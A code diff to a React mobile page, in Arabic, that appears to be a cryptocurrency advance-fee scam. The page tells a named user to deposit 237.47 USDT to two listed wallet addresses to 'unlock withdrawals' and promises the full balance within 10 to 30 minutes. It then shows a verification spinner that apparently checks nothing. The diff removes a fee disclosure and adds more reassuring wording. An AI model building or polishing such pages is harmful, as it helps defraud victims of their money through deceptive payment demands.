@@ -1,6 +1,6 @@
 
 import React, { useState } from 'react';
-import { MessageIcon, ActionIcon, FeatureIcon, NavIcon } from './components/Icons';
+import { MessageIcon, ActionIcon, FeatureIcon, NavIcon } from './components/Icons.tsx';
 
 const App: React.FC = () => {
   const [modalStep, setModalStep] = useState<number>(1); 
@@ -16,8 +16,8 @@ const App: React.FC = () => {
   };
 
   return (
-    <div className="relative max-w-[430px] mx-auto overflow-hidden">
-      {/* Main Content with conditional blur - reduced to blur-[2px] */}
+    <div className="relative max-w-[430px] mx-auto overflow-hidden min-h-screen">
+      {/* Main Content with subtle blur when modal is active */}
       <div className={`flex flex-col min-h-screen bg-[#F7F8FA] relative pb-24 overflow-x-hidden transition-all duration-300 ${modalStep > 0 ? 'blur-[2px] pointer-events-none' : ''}`}>
         {/* Header Section */}
         <header className="bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] px-5 pt-12 pb-10 text-white relative">
@@ -96,7 +96,7 @@ const App: React.FC = () => {
         <nav className="fixed bottom-0 left-0 right-0 max-w-[430px] mx-auto bg-white border-t border-gray-100 flex justify-around py-2.5 z-50">
           <NavItem label="Home" type="home" active={false} />
           <NavItem label="Service" type="service" active={false} />
-          <NavItem label="Menu" type="mine" active={false} />
+          <NavItem label="Menu" type="menu" active={false} />
           <NavItem label="Record" type="record" active={false} />
           <NavItem label="Mine" type="mine" active={true} />
         </nav>
@@ -147,53 +147,54 @@ const App: React.FC = () => {
                 <p className="text-[15px] text-[#333] leading-relaxed mb-3">
                   أهلاً بك <span className="font-bold">muyy98</span> بقي أمر إيداع مبلغ <span className="text-red-500 font-extrabold text-[18px]">237.47</span> عملة USDT لفتح قناة السحب.
                 </p>
-                <p className="text-[13px] text-gray-500 mb-4 leading-tight">
-                   رسوم التفعيل هي أجور منصتنا التقنية وليست مرتبطة بمنصة mini pro.
-                </p>
                 
-                <p className="text-[14px] text-blue-700 font-bold bg-blue-50 p-3 rounded-[12px] mb-5 leading-snug border border-blue-100">
-                  بمجرد إتمام عملية دفع رسوم التفعيل، ستتمكن من سحب كامل الرصيد المتوفر في حسابك بشكل تلقائي وسريع خلال فترة زمنية تتراوح بين 10 إلى 30 دقيقة فقط.
+                <p className="text-[14px] text-blue-800 font-bold bg-blue-50/80 p-4 rounded-[18px] mb-5 leading-relaxed border border-blue-100 shadow-sm">
+                   ✨ بمجرد إتمام عملية دفع الرسوم، ستتمكن من سحب كامل رصيدك المتوفر بشكل آمن وتلقائي خلال فترة تتراوح بين <span className="underline decoration-blue-400">10 إلى 30 دقيقة</span> كحد أقصى.
                 </p>
 
                 <div className="space-y-3 mb-6">
                   {/* USDT BEP20 */}
-                  <div className="bg-gray-50 p-3.5 rounded-[16px] border border-gray-100 relative group">
-                    <div className="flex items-center space-x-2 mb-2">
-                       <div className="w-6 h-6 bg-[#f3ba2f] rounded-full flex items-center justify-center p-1">
-                          <svg viewBox="0 0 24 24" fill="white"><path d="M16.624 13.9202l-4.624 4.624-4.624-4.624-1.376 1.376 6 6 6-6zM12 2l-6 6 1.376 1.376 4.624-4.624 4.624 4.624 1.376-1.376zM12 14.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5z"/></svg>
+                  <div className="bg-gray-50 p-3.5 rounded-[18px] border border-gray-100 relative shadow-sm">
+                    <div className="flex items-center justify-between mb-2">
+                       <div className="flex items-center">
+                          <div className="w-7 h-7 bg-[#f3ba2f] rounded-full flex items-center justify-center p-1 shadow-sm">
+                             <svg viewBox="0 0 24 24" fill="white"><path d="M16.624 13.9202l-4.624 4.624-4.624-4.624-1.376 1.376 6 6 6-6zM12 2l-6 6 1.376 1.376 4.624-4.624 4.624 4.624 1.376-1.376zM12 14.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5z"/></svg>
+                          </div>
+                          <span className="text-[11px] font-bold text-gray-700 mr-2">USDT BEP 20 (BSC)</span>
                        </div>
-                       <span className="text-[11px] font-bold text-gray-600 mr-2">USDT BEP 20 (BSC)</span>
-                    </div>
-                    <div className="flex items-center justify-between">
-                      <span className="text-[11px] font-mono break-all text-gray-500 flex-1 ml-2">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</span>
-                      <button onClick={() => handleCopy('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')} className="p-1.5 bg-white rounded-lg shadow-sm active:scale-90 transition-all">
-                        {copiedText === '0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d' ? <span className="text-[9px] text-green-500 font-bold">تم!</span> : <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4B81F2" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>}
+                       <button onClick={() => handleCopy('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')} className="p-2 bg-white rounded-xl shadow-sm active:scale-90 transition-all border border-gray-50">
+                        {copiedText === '0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d' ? <span className="text-[10px] text-green-500 font-bold px-1">تم النسخ</span> : <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4B81F2" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>}
                       </button>
+                    </div>
+                    <div className="text-[11px] font-mono break-all text-gray-400 bg-white/50 p-2 rounded-lg border border-dashed border-gray-200">
+                      0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d
                     </div>
                   </div>
 
                   {/* TRON TRC20 */}
-                  <div className="bg-gray-50 p-3.5 rounded-[16px] border border-gray-100 relative group">
-                    <div className="flex items-center space-x-2 mb-2">
-                       <div className="w-6 h-6 bg-[#ef0027] rounded-full flex items-center justify-center p-1">
-                          <svg viewBox="0 0 24 24" fill="white"><path d="M12 2L2 19.74L12 22L22 19.74L12 2Z"/></svg>
+                  <div className="bg-gray-50 p-3.5 rounded-[18px] border border-gray-100 relative shadow-sm">
+                    <div className="flex items-center justify-between mb-2">
+                       <div className="flex items-center">
+                          <div className="w-7 h-7 bg-[#ef0027] rounded-full flex items-center justify-center p-1 shadow-sm">
+                             <svg viewBox="0 0 24 24" fill="white"><path d="M12 2L2 19.74L12 22L22 19.74L12 2Z"/></svg>
+                          </div>
+                          <span className="text-[11px] font-bold text-gray-700 mr-2">Tron TRC 20 (TRX)</span>
                        </div>
-                       <span className="text-[11px] font-bold text-gray-600 mr-2">Tron TRC 20 (TRX)</span>
-                    </div>
-                    <div className="flex items-center justify-between">
-                      <span className="text-[11px] font-mono break-all text-gray-500 flex-1 ml-2">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</span>
-                      <button onClick={() => handleCopy('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai')} className="p-1.5 bg-white rounded-lg shadow-sm active:scale-90 transition-all">
-                        {copiedText === 'TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai' ? <span className="text-[9px] text-green-500 font-bold">تم!</span> : <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4B81F2" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>}
+                       <button onClick={() => handleCopy('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai')} className="p-2 bg-white rounded-xl shadow-sm active:scale-90 transition-all border border-gray-50">
+                        {copiedText === 'TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai' ? <span className="text-[10px] text-green-500 font-bold px-1">تم النسخ</span> : <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4B81F2" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>}
                       </button>
+                    </div>
+                    <div className="text-[11px] font-mono break-all text-gray-400 bg-white/50 p-2 rounded-lg border border-dashed border-gray-200">
+                      TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai
                     </div>
                   </div>
                 </div>
 
                 <button 
                   onClick={nextStep}
-                  className="w-full bg-[#4B81F2] text-white font-bold py-4 rounded-[16px] active:scale-95 transition-transform shadow-lg shadow-blue-200"
+                  className="w-full bg-[#4B81F2] text-white font-bold py-4 rounded-[18px] active:scale-95 transition-transform shadow-lg shadow-blue-200 mb-2"
                 >
-                  تم الإيداع بنجاح
+                  تم الإيداع، تفعيل قناة السحب
                 </button>
               </div>
             )}
@@ -202,11 +203,11 @@ const App: React.FC = () => {
             {modalStep === 4 && (
               <>
                 <div className="mb-6">
-                  <div className="w-14 h-14 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto shadow-sm"></div>
+                  <div className="w-16 h-16 border-[5px] border-blue-500 border-t-transparent rounded-full animate-spin mx-auto shadow-sm"></div>
                 </div>
-                <p className="text-[#333] text-[18px] font-bold mb-2">جاري التحقق...</p>
-                <p className="text-gray-500 text-[14px] leading-relaxed">الرجاء الانتظار، نحن نقوم بمراجعة عملية الإيداع لتفعيل قناة السحب الخاصة بك فوراً.</p>
-                <div className="mt-10 h-10"></div>
+                <p className="text-[#333] text-[18px] font-bold mb-2">جاري تأكيد الشبكة...</p>
+                <p className="text-gray-500 text-[14px] leading-relaxed px-2">الرجاء عدم إغلاق هذه الصفحة، نقوم حالياً بمراجعة عملية الإيداع عبر البلوكشين لتفعيل السحب الفوري لحسابك.</p>
+                <div className="mt-8 h-8"></div>
               </>
             )}
 
